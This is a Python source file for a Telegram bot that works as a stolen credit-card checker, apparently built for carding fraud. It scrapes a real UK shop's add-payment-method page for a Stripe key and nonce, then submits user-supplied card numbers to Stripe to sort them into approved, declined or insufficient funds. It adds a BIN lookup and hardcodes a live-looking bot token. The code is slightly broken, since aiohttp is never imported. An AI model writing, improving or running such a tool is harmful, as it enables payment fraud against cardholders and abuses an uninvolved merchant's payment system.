import requests
import time
import asyncio
import re
import json
import random
import uuid
from datetime import datetime
from fake_useragent import UserAgent

TOKEN = "8744089475:AAHNGB2ZyMeRcWkOwN3GUrdKkqY2t4Dhgb8"
OWNER_USERNAME = "o8380"
OWNER_NAME = "Mustafa"

print(f"🤖 Bot Started - By {OWNER_NAME} @{OWNER_USERNAME}")

# مسح webhook
requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")

# ============================================
# Stripe Gateway Functions
# ============================================

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except:
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

async def process_stripe_card(card_data):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        async with aiohttp.ClientSession() as session:
            headers = {'user-agent': ua.random}
            resp = await session.get(site_url, headers=headers)
            resp_text = await resp.text()
            
            add_card_nonce = gets(resp_text, 'createAndConfirmSetupIntentNonce":"', '"')
            if not add_card_nonce:
                add_card_nonce = gets(resp_text, 'add_card_nonce":"', '"')
            
            stripe_key = gets(resp_text, '"key":"pk_', '"')
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', resp_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                return False, 'Stripe key not found'
            
            # Create payment method
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'key': stripe_key
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data) as pm_resp:
                pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create payment method'
            
            return True, 'Approved'
            
    except Exception as e:
        return False, f'Error: {str(e)}'

def check_card(card_input):
    try:
        parts = card_input.split('|')
        if len(parts) != 4:
            return "❌ Invalid format. Use: cc|month|year|cvv"
        
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        
        card_data = {'number': cc, 'exp_month': mm, 'exp_year': yy, 'cvc': cvv}
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        is_approved, response_msg = loop.run_until_complete(process_stripe_card(card_data))
        loop.close()
        
        if is_approved:
            return f"✅ APPROVED | {response_msg}"
        elif 'insufficient' in response_msg.lower():
            return f"💰 INSUFFICIENT FUNDS | {response_msg}"
        else:
            return f"❌ DECLINED | {response_msg}"
            
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================
# BIN Lookup
# ============================================

def get_bin_info(cc):
    result = {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown', 'flag': '🌍'}
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", headers={'Accept-Version': '3'}, timeout=8)
        if response.status_code == 200:
            data = response.json()
            result['brand'] = data.get('scheme', 'Unknown').upper()
            result['type'] = data.get('type', 'Unknown').upper()
            result['bank'] = data.get('bank', {}).get('name', 'Unknown')
            result['country'] = data.get('country', {}).get('name', 'Unknown')
            flag_map = {'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'RU': '🇷🇺', 'AE': '🇦🇪'}
            result['flag'] = flag_map.get(data.get('country', {}).get('alpha2', ''), '🌍')
    except:
        pass
    return result

# ============================================
# Bot Main Loop
# ============================================

last_id = 0
print("Waiting for messages...")

while True:
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
        response = requests.get(url, timeout=35)
        data = response.json()
        
        if data.get("ok") and data.get("result"):
            for update in data["result"]:
                last_id = update["update_id"]
                chat_id = update["message"]["chat"]["id"]
                text = update["message"].get("text", "")
                first_name = update["message"]["chat"].get("first_name", "User")
                
                print(f"Received: {text}")
                
                # /start command
                if text == "/start":
                    msg = f"""✅ Bot is working {first_name}!
━━━━━━━━━━━━━━━━
Send card: 123456|12|28|123
/pp 123456|12|28|123
━━━━━━━━━━━━━━━━
Dev: @{OWNER_USERNAME}"""
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                
                # /pp command
                elif text.startswith("/pp"):
                    card = text.replace("/pp", "").strip()
                    if not card:
                        msg = "❌ Usage: /pp 123456|12|28|123"
                    else:
                        msg = check_card(card)
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                
                # /bin command
                elif text.startswith("/bin"):
                    bin_num = text.replace("/bin", "").strip()
                    if not bin_num or len(bin_num) < 6:
                        msg = "❌ Usage: /bin 123456"
                    else:
                        bin_data = get_bin_info(bin_num[:6])
                        msg = f"""🔍 BIN: {bin_num[:6]}
━━━━━━━━━━━━━━━━
Brand: {bin_data['brand']}
Type: {bin_data['type']}
Bank: {bin_data['bank']}
Country: {bin_data['country']} {bin_data['flag']}"""
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                
                # Auto detect card (contains |)
                elif '|' in text and not text.startswith('/'):
                    msg = check_card(text)
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                
                # Help
                elif text == "/help":
                    msg = """Commands:
/pp 123456|12|28|123 - Check card
/bin 123456 - BIN lookup
/start - Restart bot"""
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                
                else:
                    msg = "Send /pp or card: 123456|12|28|123"
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": chat_id, "text": msg})
                    
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
